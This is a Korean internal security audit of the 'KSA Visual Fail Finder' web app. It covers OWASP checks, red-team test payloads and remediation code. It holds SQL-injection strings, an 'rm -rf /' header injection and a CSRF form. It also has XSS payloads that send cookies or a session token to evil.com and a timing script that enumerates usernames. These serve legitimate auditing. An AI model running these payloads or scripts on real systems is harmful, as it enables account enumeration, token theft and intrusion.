# Security Audit Report — KSA Visual Fail Finder

| 항목 | 내용 |
|------|------|
| **감사 일자** | 2026-03-17 |
| **감사자** | 내부 보안 검토 |
| **대상 버전** | beta v0.1.0 |
| **감사 범위** | 백엔드 FastAPI + 프론트엔드 React 전체 |
| **감사 방법론** | OWASP Top 10 2021, Red Team 관점 코드 리뷰, 실제 페이로드 검증 |

---

## 경영진 요약 (Executive Summary)

KSA Visual Fail Finder는 내부 사용자만 접근 가능한 학급 탐색 애플리케이션으로, 외부 공개 서비스 대비 공격 노출 면적이 제한적입니다. 전반적으로 코드 품질은 양호하며, 심각한 1-click 공격 경로는 발견되지 않았습니다.

그러나 이번 감사에서 **기존 보고서에서 "안전"으로 판정한 항목 중 2건의 실제 악용 가능한 취약점**을 새로 발견했습니다.

| 등급 | 건수 | 주요 항목 |
|------|------|----------|
| 🔴 **High** | 1 | 타이밍 공격 기반 계정 열거 (SEC-T01) |
| 🟠 **Medium** | 3 | Rate Limit IP 우회 (SEC-T02), CSP 부재 (SEC-T03), 멀티워커 Rate Limit 무력화 |
| 🟡 **Low** | 4 | localStorage 토큰, Cache-Control 누락, DoS 벡터 2건 |
| ✅ **수정 완료** | 5 | 입력검증, 비밀정보 노출, 보안헤더, Rate Limit, 의존성 |
| ✅ **안전 확인** | 7 | SQL Injection, Command Injection, XSS, CSRF, IDOR, 파일업로드, 비즈니스로직 |

**즉시 조치 필요**: SEC-T01 (타이밍 공격), SEC-T02 (Rate Limit IP 우회)

---

## 개발자 액션 플랜

| 우선순위 | 항목 | 예상 작업 | 담당 파일 |
|----------|------|----------|----------|
| P0 (즉시) | 타이밍 공격 방지 | dummy bcrypt 추가 (~5줄) | `auth_router.py` |
| P0 (즉시) | Rate Limit IP 실제 추출 | X-Forwarded-For 처리 추가 | `auth_router.py` |
| P1 (1주) | CSP 헤더 추가 | SecurityHeadersMiddleware 1줄 | `main.py` |
| P1 (1주) | Cache-Control 헤더 | GET / 응답에 헤더 추가 | `main.py` |
| P2 (배포 전) | Redis Rate Limiter | 멀티워커 환경 시 | `auth_router.py` |
| P2 (배포 전) | pip freeze 잠금 | lock 파일 생성 | `requirements.txt` |
| P3 (개선) | sessionStorage 전환 | 탭 종료 시 토큰 자동 삭제 | `frontend/src/App.tsx` |

---

## 위험도 평가 기준

| 등급 | 기준 | 즉시 조치 |
|------|------|----------|
| 🔴 **Critical** | 인증 우회 / 원격 코드 실행 / 대량 데이터 유출 | 즉시 |
| 🔴 **High** | 계정 탈취 보조 / 민감정보 열거 가능 | 즉시~24h |
| 🟠 **Medium** | 보안 통제 우회 가능 / 공격 효율 상승 | 1주 이내 |
| 🟡 **Low** | 공격 가능성 낮음 / 심층 방어 개선 사항 | 1개월 이내 |
| ℹ️ **Info** | 모범 사례 미준수 / 위협 없음 | 선택 |

---

---

# 기존 항목 재검증 (Red Team 관점)

---

## SEC-01 — SQL Injection

**판정: ✅ 안전 (재검증 통과)**
**위험도: N/A**

### 분석

전체 DB 접근이 SQLAlchemy ORM으로 파라미터화됨.

```python
# auth_router.py
db.query(models.User).filter(models.User.username == body.username).first()
# 실제 SQL: SELECT * FROM users WHERE username = ?  ← 바인드 파라미터

# admin_router.py
query.filter(models.Student.stuId.contains(q) | models.Student.name.contains(q))
# 실제 SQL: WHERE stuId LIKE ?  ← '%value%' 파라미터 바인딩
```

### Red Team — 우회 시도

```
# 시도 1: 클래식 SQLi
POST /auth/login {"username": "' OR 1=1 --", "password": "x"}
→ WHERE username = "' OR 1=1 --"  ← 문자열 리터럴로 처리, 로직 변경 없음
→ 결과: 401 (공격 실패)

# 시도 2: UNION-based
POST /auth/login {"username": "' UNION SELECT 1,2,3 --", "password": "x"}
→ 동일, 파라미터 바인딩으로 무력화

# 시도 3: LIKE Wildcard (admin 전용)
GET /admin/students?q=%25  (URL 인코딩된 %)
→ LIKE '%%' → 전체 학생 반환
→ admin 권한 필요, 실질적 위협 없음
```

### 잔존 참고 사항

`contains()` LIKE wildcard 미이스케이프는 admin 전용 endpoint이므로 실질적 위협 없음. 그러나 SQLAlchemy 2.x의 `.contains("value", autoescape=True)` 옵션으로 방어 심도 강화 가능.

---

## SEC-02 — Command Injection

**판정: ✅ 안전 (재검증 통과)**
**위험도: N/A**

### 분석

```python
result = subprocess.run(
    [sys.executable, "-m", "backend.parser_run"],  # 완전 하드코딩
    capture_output=True, text=True, timeout=300,
)
```

### Red Team — 우회 시도

```
# 시도 1: 요청 본문에 명령 삽입
POST /admin/sync Content-Type: application/json
→ 이 endpoint의 body 파라미터가 없음, Pydantic이 알 수 없는 필드 무시

# 시도 2: Header injection
POST /admin/sync
X-Custom: "; rm -rf /"
→ 헤더는 subprocess.run()에 전달되지 않음

# 시도 3: sys.executable 경로 조작
→ 환경변수 PATH 조작으로 실행 파일 변경 시도
→ sys.executable은 Python 인터프리터 절대 경로, shell=False로 환경변수 경유 없음
```

---

## SEC-03 — XSS (Cross-Site Scripting)

**판정: ✅ 안전 (재검증 통과)**
**위험도: N/A**

### 분석

```bash
grep -r "dangerouslySetInnerHTML" frontend/src/
→ 결과 없음

grep -r "innerHTML" frontend/src/
→ 결과 없음
```

React JSX의 `{}` 표현식은 DOM API의 `textContent`/`createTextNode`로 처리되어 HTML 파싱 없이 렌더링됨.

### Red Team — Stored XSS 시도

```
# KSAIN API에서 악성 과목명이 들어왔다고 가정
subject.name = '<img src=x onerror="fetch(\'https://evil.com/?\'+document.cookie)">'

React 렌더링:
<span>{subject.name}</span>
→ DOM: &lt;img src=x onerror="..."&gt;  ← 이스케이프됨, 실행 불가
```

### CSP 부재 주의

XSS 자체는 막혀있으나, CSP(Content-Security-Policy) 헤더가 없어 만약 XSS 벡터가 발생했을 때 추가 방어선이 없음. SEC-T03 참조.

---

## SEC-04 — CSRF

**판정: ✅ 안전 (구조적 면역)**
**위험도: N/A**

Bearer 토큰 방식은 CSRF에 구조적으로 면역. 브라우저는 크로스오리진 요청에 `Authorization` 헤더를 자동 포함하지 않음.

### Red Team — CSRF 우회 시도

```html
<!-- 공격자 사이트 -->
<form action="https://api.ksa.example.com/admin/users" method="POST">
  <input name="username" value="backdoor">
  <input name="password" value="hacked">
</form>
→ Content-Type: application/x-www-form-urlencoded → FastAPI JSON 파서 422 반환

<fetch 요청>
fetch('https://api.ksa.example.com/', {
  credentials: 'include',  // 쿠키 포함 시도
})
→ Bearer 토큰이 쿠키가 아닌 Authorization 헤더 → 자동 전송 불가
```

---

## SEC-05 — 인증 우회 (Authentication Bypass)

**판정: ✅ 안전 (재검증 통과)**
**위험도: N/A**

### Endpoint 보호 매트릭스

| Endpoint | 보호 레벨 | 검증 위치 |
|----------|----------|----------|
| `POST /auth/login` | 공개 (의도적) | — |
| `GET /` | `get_current_user` | auth.py L45 |
| `POST /auth/logout` | `get_current_user` | auth.py L45 |
| `GET /auth/me` | `get_current_user` | auth.py L45 |
| `GET /auth/sessions` | `get_current_user` | auth.py L45 |
| `DELETE /auth/sessions/{id}` | `get_current_user` + ownership | auth_router.py L127 |
| `GET /admin/*` | `get_current_admin` (is_admin 검증) | auth.py L72 |
| `POST/PATCH/DELETE /admin/*` | `get_current_admin` | auth.py L72 |

### `get_current_user` 검증 로직

```python
def get_current_user(credentials, db):
    if credentials is None:
        raise HTTPException(401)          # 1. 토큰 없음

    session = db.query(Session).filter(
        Session.session_token == credentials.credentials
    ).first()
    if session is None:
        raise HTTPException(401)          # 2. 토큰 DB 조회 실패

    if datetime.utcnow() > session.expires_at:
        db.delete(session); db.commit()
        raise HTTPException(401)          # 3. 만료 → 즉시 삭제

    session.last_used_at = datetime.utcnow()
    db.commit()
    return session.user                   # 4. 정상
```

### Red Team — 인증 우회 시도

```
# 시도 1: 빈 토큰
Authorization: Bearer
→ HTTPBearer가 빈 credentials 거부 → 401

# 시도 2: 가짜 토큰
Authorization: Bearer AAAAAAAAAAAAAAAA
→ DB 조회 실패 → 401

# 시도 3: 만료된 토큰 재사용
→ expires_at 비교 → 만료 세션 즉시 삭제 → 401

# 시도 4: 알고리즘 없음 / JWT 삽입 시도
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
→ 단순 문자열로 DB 조회 → 존재하지 않음 → 401
(JWT가 아닌 opaque token 방식이라 JWT 알고리즘 조작 공격 원천 불가)
```

---

## SEC-06 — 인가 취약점 / IDOR

**판정: ✅ 안전 (재검증 통과)**
**위험도: N/A**

### 분석

```python
# 세션 삭제: 본인 소유 검증
session = db.query(Session).filter(
    Session.id == session_id,
    Session.user_id == current_user.id,   # ← ownership 체크
).first()

# 자기 자신 보호
if user_id == current.id:
    raise HTTPException(400, "Cannot delete yourself")
```

### Red Team — IDOR 시도

```
# 시도 1: 다른 유저 세션 삭제
DELETE /auth/sessions/1  (admin 세션 ID)
Authorization: Bearer <일반유저_토큰>
→ filter(Session.user_id == 일반유저.id) → None → 404

# 시도 2: 일반 유저가 admin 삭제
DELETE /admin/users/1
Authorization: Bearer <일반유저_토큰>
→ get_current_admin: is_admin=False → 403

# 시도 3: 음수/0 ID 주입
DELETE /auth/sessions/0
→ DB 조회 → 존재하지 않음 → 404
```

---

## SEC-07 — 입력값 검증

**판정: ✅ 수정 완료**

### 변경 전/후 비교

| 필드 | 수정 전 | 수정 후 |
|------|--------|--------|
| `LoginRequest.username` | `str` (무제한) | `str` (1–64자) |
| `LoginRequest.password` | `str` (무제한) | `str` (1–128자) |
| `LoginRequest.device_type` | `str` (임의값) | `Literal["web", "mobile"]` |
| `CreateUserRequest.password` | `str` (1자도 가능) | `str` (5–128자) |
| `SetAliasesRequest.aliases` | `list[str]` (무제한) | `list[str]` (최대 30개, 각 64자) |
| `GET /admin/students?q=` | 무제한 | `max_length=100` |

---

## SEC-08 — 파일 업로드

**판정: ✅ 해당없음**

파일 업로드 endpoint 없음. `python-multipart`는 FastAPI 폼 파싱 의존성으로만 포함.

---

## SEC-09 — 비밀정보 노출

**판정: ✅ 수정 완료**

```python
# Before: stderr → HTTP 응답 body (서버 경로, 스택 트레이스 노출)
raise HTTPException(500, detail=result.stderr or "Sync failed")

# After: stderr → 서버 로그, 클라이언트에는 generic 메시지
logger.error("Sync failed (exit %d): %s", result.returncode, result.stderr)
raise HTTPException(500, detail="Sync failed. Check server logs.")
```

---

## SEC-10 — CORS 및 보안 헤더

**판정: ✅ CORS 안전 / 보안 헤더 수정 완료**

현재 적용된 보안 헤더:

| 헤더 | 값 | 방어 |
|------|----|----|
| `X-Content-Type-Options` | `nosniff` | MIME Sniffing 방지 |
| `X-Frame-Options` | `DENY` | Clickjacking 방지 |
| `X-XSS-Protection` | `1; mode=block` | 구형 브라우저 XSS 필터 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 경로 유출 방지 |
| `HSTS` | `max-age=31536000` | HTTPS 강제 (`FORCE_HTTPS=1` 시) |

**미적용 헤더 (SEC-T03 참조)**: `Content-Security-Policy`

CORS 설정:
```python
allow_origins=[o.strip() for o in _origins.split(",")]  # 환경변수 기반 화이트리스트
allow_credentials=True  # OK (wildcard와 함께 사용하지 않음)
allow_methods=["*"]     # 개선 여지 있음 → ["GET", "POST", "PUT", "PATCH", "DELETE"]
allow_headers=["*"]     # 개선 여지 있음 → ["Authorization", "Content-Type"]
```

---

## SEC-11 — Rate Limiting

**판정: ✅ 기본 수정 완료 / 추가 개선 필요 (SEC-T02 참조)**

현재 구현: IP당 60초 내 10회 초과 시 429. 슬라이딩 윈도우 방식으로 시간 경계 우회 불가.

**한계**: 멀티워커/멀티서버 환경에서 프로세스 간 공유 불가 (SEC-T02, T04 참조).

---

## SEC-12 — 비즈니스 로직

**판정: ✅ 안전**

`/admin/sync`: subprocess 동기 실행 (timeout=300), admin 전용. 연속 호출 어뷰즈 가능성은 이론적이나 admin 탈취가 전제되어야 함.

---

## SEC-13 — Race Condition / 동시성

**판정: ✅ SQLite 환경에서 안전 / PostgreSQL 전환 시 수정 필요**

SQLite WAL 모드가 쓰기 직렬화를 보장. PostgreSQL 전환 시 아래 패턴 적용 필요:

```python
# SELECT FOR UPDATE로 원자적 처리
user = db.query(models.User).filter(...).with_for_update().first()
db.query(models.Session).filter(models.Session.user_id == user.id).delete()
db.add(new_session)
db.commit()
```

---

## SEC-14 — Dependency 취약점

**판정: ✅ 수정 완료**

현재 `requirements.txt`:
```
fastapi>=0.115.0
uvicorn>=0.32.0
sqlalchemy>=2.0.0
httpx>=0.27.0
bcrypt>=4.0.0          # 4.0 미만: timing attack 취약
python-multipart>=0.0.12  # 0.0.12 미만: CVE-2024-53981 DoS
```

---

## SEC-15 — 로그 및 에러 처리

**판정: ✅ 안전 (SEC-09 연계)**

```python
# 동일 오류 메시지로 계정 열거 방지
if not user or not verify_password(body.password, user.hashed_password):
    raise HTTPException(401, "Invalid credentials")
    # username 없음 / 비밀번호 틀림 → 동일 메시지
```

단, 응답 시간 차이로 인한 타이밍 기반 열거는 가능 (SEC-T01 참조).

```python
# main.py 마이그레이션 예외 처리
try:
    _conn.execute(text(_stmt))
except Exception:
    pass  # 범위 넓음 — 운영 로그 없이 예상치 못한 에러 무시 위험
```

---

---

# 신규 발견 취약점 (이전 보고서 미수록)

---

## SEC-T01 — 타이밍 공격 기반 계정 열거

**판정: 🔴 취약점 발견 — 즉시 수정 권장**
**위험도: High**
**CVSS v3.1**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — **5.3 (Medium~High)**

### 취약점 설명

`/auth/login`에서 username 존재 여부에 따라 응답 시간이 달라집니다. Python의 단락 평가(`short-circuit evaluation`) 때문에, username이 DB에 없으면 `verify_password()` (bcrypt, ~100ms)가 호출되지 않아 응답이 즉시 반환됩니다.

```python
# auth_router.py L63 — 현재 코드
user = db.query(models.User).filter(models.User.username == body.username).first()
if not user or not verify_password(body.password, user.hashed_password):
    raise HTTPException(401, "Invalid credentials")

# 실행 흐름:
# username 없음: if not None → True (단락) → 즉시 401  ← ~1ms
# username 있음: if not user=False → verify_password() → 401  ← ~100ms
```

### 공격 시나리오

```python
import requests, statistics, time

def measure(username):
    times = []
    for _ in range(10):
        t = time.time()
        requests.post("https://api.example.com/auth/login",
                      json={"username": username, "password": "wrong"})
        times.append(time.time() - t)
    return statistics.mean(times)

# 계정 존재 여부 열거
for username in ["admin", "teacher", "user1", "user2", ...]:
    t = measure(username)
    if t > 0.08:  # bcrypt 임계값
        print(f"[+] 계정 존재 확인: {username}")
```

### 영향 범위

- 공격자가 유효한 username 목록을 수집 가능
- 이후 credential stuffing / 사전 공격의 효율이 대폭 상승
- Rate Limit(10회/60초) 안에서도 충분히 수십 개 계정 열거 가능

### 탐지 방법

응답 시간을 측정하는 자동화 스크립트로 탐지 가능. 서버 로그에서 단시간 내 동일 IP에서 오는 다수의 401 응답 패턴으로 식별.

### 수정 코드

```python
# auth_router.py — 수정 후
import hmac

# 모듈 레벨에서 더미 해시를 미리 계산 (서버 시작 시 1회)
_DUMMY_HASH: str = hash_password("dummy-constant-value-xK9#mP2@")

@router.post("/login", response_model=SessionResponse)
def login(request: Request, body: LoginRequest, db: Session = Depends(get_db)):
    client_ip = request.client.host if request.client else "unknown"
    _check_login_rate_limit(client_ip)

    user = db.query(models.User).filter(
        models.User.username == body.username
    ).first()

    if user:
        # 실제 패스워드 검증
        password_valid = verify_password(body.password, user.hashed_password)
    else:
        # username이 없어도 bcrypt를 동일하게 실행 → 응답 시간 균등화
        verify_password(body.password, _DUMMY_HASH)
        password_valid = False

    if not password_valid:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    _reset_login_rate_limit(client_ip)
    clear_user_sessions(db, user)
    # ... 이후 동일
```

### 추가 방어 전략

- 로그인 시도 간 최소 응답 시간 보장 (`asyncio.sleep(0.1)` 등)
- 계정 잠금(Lock) 정책: 5회 실패 시 15분 잠금
- 알림: 동일 IP에서 다수 401 발생 시 관리자 알림

---

## SEC-T02 — Rate Limit IP 우회 (Proxy 환경)

**판정: 🟠 취약점 발견 — 1주 내 수정 권장**
**위험도: Medium**
**CVSS v3.1**: AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N — **4.8 (Medium)**

### 취약점 설명

현재 Rate Limiter는 `request.client.host`를 IP 키로 사용합니다. nginx 또는 다른 리버스 프록시 뒤에 배포할 경우, 모든 요청의 `request.client.host`가 `127.0.0.1`이 됩니다 — Rate Limit이 **전체 사용자에 대해 공유**되거나 사실상 무력화됩니다.

```python
# auth_router.py L59 — 현재 코드
client_ip = request.client.host if request.client else "unknown"
# nginx 뒤: request.client.host == "127.0.0.1" (항상)
# → 모든 요청이 동일 IP로 카운트됨
```

### 공격 시나리오

**시나리오 A — Proxy 뒤 Rate Limit 공유 문제**
```
공격자 10명이 각자 1회씩 요청 → 전부 127.0.0.1로 집계
→ 카운터 10 = LIMIT → 정당한 사용자도 429
또는
→ 반대로, 실제로 nginx가 X-Forwarded-For 설정 없으면
  공격자는 무제한 브루트포스 가능
```

**시나리오 B — X-Forwarded-For 스푸핑**
```python
# X-Forwarded-For 헤더를 직접 읽을 경우 IP 위조 가능
POST /auth/login
X-Forwarded-For: 1.2.3.4   ← 공격자가 매번 바꿔서 전송
→ 매 요청마다 다른 IP로 인식 → Rate Limit 완전 우회
```

### 수정 코드

```python
# auth_router.py — 실제 클라이언트 IP 추출 헬퍼

def _get_client_ip(request: Request) -> str:
    """
    리버스 프록시 환경에서 실제 클라이언트 IP 추출.
    X-Forwarded-For를 신뢰하되, 프록시 설정 후에만 활성화할 것.
    """
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        # 첫 번째 IP가 실제 클라이언트 (nginx trusted_proxy 설정 필요)
        return forwarded_for.split(",")[0].strip()
    real_ip = request.headers.get("X-Real-IP")
    if real_ip:
        return real_ip.strip()
    return request.client.host if request.client else "unknown"
```

> **⚠️ 중요**: `X-Forwarded-For`를 신뢰하려면 nginx에서 신뢰할 수 없는 X-Forwarded-For를 덮어쓰도록 설정해야 합니다. 그렇지 않으면 스푸핑 취약점이 발생합니다.

**nginx 설정 (신뢰할 수 있는 IP 출처 확보)**:
```nginx
# /etc/nginx/sites-available/visualfailfinder
location / {
    # 기존 X-Forwarded-For를 무시하고 nginx가 직접 설정
    proxy_set_header X-Forwarded-For $remote_addr;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_pass http://127.0.0.1:8000;
}
```

---

## SEC-T03 — CSP (Content-Security-Policy) 부재

**판정: 🟠 미적용 — 1주 내 추가 권장**
**위험도: Medium (XSS와 연계 시 High)**

### 취약점 설명

현재 API 응답에 `Content-Security-Policy` 헤더가 없습니다. CSP는 XSS 취약점이 발생했을 때의 **최후 방어선**으로, 인라인 스크립트 실행과 외부 리소스 로딩을 제한합니다.

XSS 자체는 현재 안전하지만(SEC-03), 미래의 서드파티 의존성 추가나 개발 실수로 XSS가 발생할 경우 CSP가 없으면 쿠키/토큰 탈취, 데이터 exfiltration이 자유롭게 가능합니다.

### 영향 범위

CSP 없이 XSS가 발생할 경우:
```javascript
// 공격자가 localStorage의 세션 토큰 탈취 가능
fetch("https://evil.com/" + localStorage.getItem("ksa_session_token"))
```

### 수정 코드

```python
# main.py — SecurityHeadersMiddleware에 CSP 추가
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: StarletteRequest, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        # CSP 추가 — API 서버이므로 strict하게
        response.headers["Content-Security-Policy"] = "default-src 'none'; frame-ancestors 'none'"
        if os.environ.get("FORCE_HTTPS"):
            response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        return response
```

> **프론트엔드 Vite 빌드**에는 별도 CSP 설정이 필요합니다. Vite 배포 시 `index.html` 또는 nginx에서 CSP를 적용하세요:
> ```
> Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.yourdomain.com
> ```

---

## SEC-T04 — 멀티워커 Rate Limit 무력화

**판정: 🟠 아키텍처 한계 — 배포 구성에 따라 대응**
**위험도: Medium (멀티워커 배포 시)**

### 취약점 설명

현재 Rate Limiter는 프로세스 내 메모리(`defaultdict`)를 사용합니다. `gunicorn -w 4` 또는 `uvicorn --workers 4`로 실행 시 각 워커가 독립적인 메모리를 가지므로, 공격자가 4개 워커에 각각 9회 요청하면 총 36회 시도가 가능합니다.

```
워커 1: 공격자가 9회 → 카운터 9 (제한 미달)
워커 2: 공격자가 9회 → 카운터 9 (제한 미달)
워커 3: 공격자가 9회 → 카운터 9 (제한 미달)
워커 4: 공격자가 9회 → 카운터 9 (제한 미달)
→ 총 36회 시도, 429 없음
```

### 현재 상황

단일 uvicorn 프로세스로 실행 중이라면 이 문제는 발생하지 않습니다. 단일 서버 셀프호스팅(N100) 환경에서는 낮은 위협.

### Redis 기반 Rate Limiter (멀티워커 배포 시 적용)

```python
# requirements.txt에 추가
# redis>=5.0.0

import redis
from datetime import datetime

_redis = redis.Redis(host="localhost", port=6379, db=0)

def _check_login_rate_limit_redis(ip: str) -> None:
    key = f"login_attempts:{ip}"
    pipe = _redis.pipeline()
    now = datetime.utcnow().timestamp()
    cutoff = now - _LOGIN_WINDOW

    pipe.zremrangebyscore(key, "-inf", cutoff)     # 만료된 시도 제거
    pipe.zadd(key, {str(now): now})                # 현재 시도 추가
    pipe.zcard(key)                                # 총 시도 수 조회
    pipe.expire(key, _LOGIN_WINDOW)                # TTL 설정
    _, _, count, _ = pipe.execute()

    if count > _LOGIN_LIMIT:
        raise HTTPException(429, f"Too many login attempts.")
```

---

## SEC-T05 — localStorage 세션 토큰 저장

**판정: 🟡 보안 권고사항 — 단독으로는 낮은 위협**
**위험도: Low**

### 취약점 설명

세션 토큰이 `localStorage`에 저장됩니다.

```typescript
// App.tsx
localStorage.setItem("ksa_session_token", token)
```

`localStorage`는 동일 Origin의 모든 JavaScript에서 접근 가능하므로, XSS가 발생할 경우 토큰이 즉시 탈취됩니다.

### 현재 위협 수준

현재 XSS가 불가능한 환경(SEC-03)이므로 실질적 위협은 낮습니다. 그러나 심층 방어 관점에서 `sessionStorage`가 더 안전합니다:
- `sessionStorage`: 탭 닫으면 자동 삭제, 탭 간 공유 불가
- `localStorage`: 브라우저 재시작 후에도 유지, 동일 Origin의 모든 탭에서 접근 가능

### 권고 사항

```typescript
// App.tsx — sessionStorage로 전환 (페이지 새로고침 유지, 탭 종료 시 삭제)
// 현재 30일 세션 만료를 유지하면서 보안 강화

// localStorage → sessionStorage
const token = sessionStorage.getItem("ksa_session_token")
sessionStorage.setItem("ksa_session_token", token)
sessionStorage.removeItem("ksa_session_token")

// 단, 탭 종료 시 로그인 상태 유지가 필요하면 localStorage 유지
// 현재 30일 세션 만료 정책상 localStorage가 UX에 더 적합할 수 있음
```

---

## SEC-T06 — Cache-Control 헤더 누락 (민감 데이터 응답)

**판정: 🟡 낮은 위협**
**위험도: Low**

### 취약점 설명

`GET /`는 전체 학생/교사/수업 데이터를 반환하지만, `Cache-Control` 헤더가 설정되어 있지 않습니다. 중간 프록시나 브라우저가 이 데이터를 캐싱할 수 있습니다.

```python
# main.py — GET / 응답에 캐시 방지 헤더 없음
return {
    "stats": {...},
    "student_counts": {...},
    "data": [...]
}
```

### 수정 코드

```python
from fastapi import Response

@app.get("/")
async def get_all_data(
    response: Response,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_user),
):
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    # ... 기존 로직
```

---

## SEC-T07 — DoS: GET / 대용량 응답

**판정: 🟡 낮은 위협 (내부 서비스)**
**위험도: Low**

### 취약점 설명

`GET /`는 모든 수업, 모든 학생, 모든 시간표를 하나의 JSON으로 반환합니다. 데이터가 수백 과목 × 수십 분반 × 수십 학생이 되면 응답 크기가 수 MB에 달할 수 있으며, 이를 반복 호출하면 서버에 부하를 줍니다.

현재는 인증 필수 endpoint이므로 외부 공격자가 직접 악용하기 어렵고, 프론트엔드에서 1시간 캐싱을 적용하므로 실질적 위협은 낮습니다.

### 권고 사항

- 응답에 `ETag` 또는 `Last-Modified` 헤더를 추가하여 조건부 요청(`If-None-Match`) 지원 고려
- 데이터셋이 매우 커질 경우 페이지네이션 도입 검토

---

## SEC-T08 — DoS: Sync Endpoint 점유

**판정: 🟡 낮은 위협 (admin 전용)**
**위험도: Low**

### 취약점 설명

`POST /admin/sync`는 최대 300초짜리 동기 subprocess를 실행합니다. uvicorn이 단일 asyncio 이벤트 루프에서 `subprocess.run()`을 직접 호출하면 해당 요청을 처리하는 스레드가 최대 5분간 블로킹됩니다.

```python
result = subprocess.run(
    [sys.executable, "-m", "backend.parser_run"],
    timeout=300,  # 5분
    # blocking call — 동기 실행
)
```

### 권고 사항

- admin만 접근 가능하므로 즉각적 위협은 없음
- 장기적으로 `asyncio.create_subprocess_exec()`로 비동기 전환 권장
- 동시 sync 실행 방지 플래그 추가 (중복 실행 차단)

---

## SEC-T09 — Session Fixation 검증

**판정: ✅ 안전 (설계 수준에서 방어)**
**위험도: N/A**

### 분석

세션 고정(Session Fixation) 공격은 공격자가 미리 알고 있는 세션 ID로 피해자를 로그인시키는 공격입니다.

```python
# auth_router.py
# 로그인 성공 시:
clear_user_sessions(db, user)          # 1. 기존 세션 전부 삭제
token = generate_session_token()       # 2. 새 토큰 생성
db.add(session); db.commit()           # 3. 저장
```

매 로그인마다 `secrets.token_urlsafe(48)` (384비트 엔트로피)로 완전히 새 토큰을 생성하고 기존 토큰을 삭제하므로, 공격자가 알고 있는 이전 토큰은 즉시 무효화됩니다.

---

## SEC-T10 — 세션 토큰 엔트로피 분석

**판정: ✅ 안전 (충분한 엔트로피)**
**위험도: N/A**

### 분석

```python
# auth.py L32
def generate_session_token() -> str:
    return secrets.token_urlsafe(48)
```

| 항목 | 값 |
|------|-----|
| 생성 함수 | `secrets.token_urlsafe(48)` |
| 바이트 엔트로피 | 48 bytes = **384 bits** |
| 인코딩 | Base64 URL-safe (64자 출력) |
| PRNG | OS CSPRNG (`/dev/urandom`) |
| NIST 권고 최소값 | 128 bits |

384비트 엔트로피는 NIST SP 800-63B 권고(128비트)의 3배. 무차별 대입 공격(Brute Force) 불가.

---

## SEC-T11 — Mass Assignment 취약점

**판정: ✅ 안전 (Pydantic 명시적 스키마)**
**위험도: N/A**

### 분석

FastAPI + Pydantic은 명시적으로 선언된 필드만 받아들입니다. 예를 들어 `CreateUserRequest`에 없는 필드는 자동으로 무시됩니다.

```python
class CreateUserRequest(BaseModel):
    username: str = Field(min_length=1, max_length=64)
    password: str = Field(min_length=5, max_length=128)
    is_admin: bool = False

# 시도: is_admin=True를 일반 유저가 POST
POST /admin/users {"username": "hack", "password": "12345", "is_admin": true}
→ 이 endpoint 자체가 Depends(get_current_admin) 보호 하에 있어 admin만 접근 가능
→ Mass assignment로 권한 상승 불가
```

---

## SEC-T12 — 계정 열거 (메시지 기반)

**판정: ✅ 메시지 통일 / ⚠️ 타이밍 기반은 SEC-T01 참조**

오류 메시지는 동일합니다:
```python
raise HTTPException(401, "Invalid credentials")
# username 없음과 password 틀림이 동일 메시지 → 메시지 기반 열거 불가
```

그러나 응답 시간 차이(~1ms vs ~100ms)로 타이밍 기반 열거는 가능합니다 (SEC-T01).

---

## SEC-T13 — API 자동화 공격 (Credential Stuffing)

**판정: 🟠 부분 방어 — Rate Limit 존재하나 우회 가능**

현재 Rate Limit(10회/60초/IP)이 기본 보호를 제공합니다. 그러나:

- 분산 Botnet(다수 IP)을 사용하면 Rate Limit 우회 가능
- 현재 사용자 DB 규모(소규모 학교)에서는 실질적 위협 낮음

추가 권고:
- 반복 실패 후 계정 임시 잠금 (Account Lockout)
- `Retry-After` 헤더 반환으로 표준 준수

```python
raise HTTPException(
    status_code=429,
    detail=f"Too many login attempts. Please wait {_LOGIN_WINDOW} seconds.",
    headers={"Retry-After": str(_LOGIN_WINDOW)},  # 추가
)
```

---

## SEC-T14 — CORS 설정 심층 분석

**판정: ℹ️ 기능적으로 안전 / 최소 권한 원칙 위반**
**위험도: Info**

```python
allow_methods=["*"]   # DELETE, PATCH 등 모든 메서드 허용
allow_headers=["*"]   # 모든 헤더 허용
```

최소 권한 원칙 적용 권장:
```python
allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
allow_headers=["Authorization", "Content-Type"],
```

---

## SEC-T15 — 의존성 Supply Chain 공격 대응

**판정: 🟡 개선 필요**
**위험도: Low**

현재 `>=` 버전 범위 지정은 알려진 취약 버전을 방지하지만, 악의적으로 패키지가 업데이트될 경우 대응이 안 됩니다.

### 권고 사항

```bash
# 배포 시 완전한 버전 및 해시 잠금
pip install -r requirements.txt
pip freeze > requirements-lock.txt

# 설치 시 해시 검증 (--require-hashes)
pip install --require-hashes -r requirements-lock.txt
```

자동 취약점 스캔:
```bash
# 정기적 실행 권장
pip install pip-audit
pip-audit -r requirements.txt
```

---

---

# 종합 현황 및 조치 요약

## 전체 취약점 현황

| ID | 항목 | 위험도 | 상태 |
|----|------|--------|------|
| SEC-01 | SQL Injection | N/A | ✅ 안전 |
| SEC-02 | Command Injection | N/A | ✅ 안전 |
| SEC-03 | XSS | N/A | ✅ 안전 |
| SEC-04 | CSRF | N/A | ✅ 안전 (구조적 면역) |
| SEC-05 | 인증 우회 | N/A | ✅ 안전 |
| SEC-06 | IDOR | N/A | ✅ 안전 |
| SEC-07 | 입력값 검증 | — | ✅ 수정 완료 |
| SEC-08 | 파일 업로드 | N/A | ✅ 해당없음 |
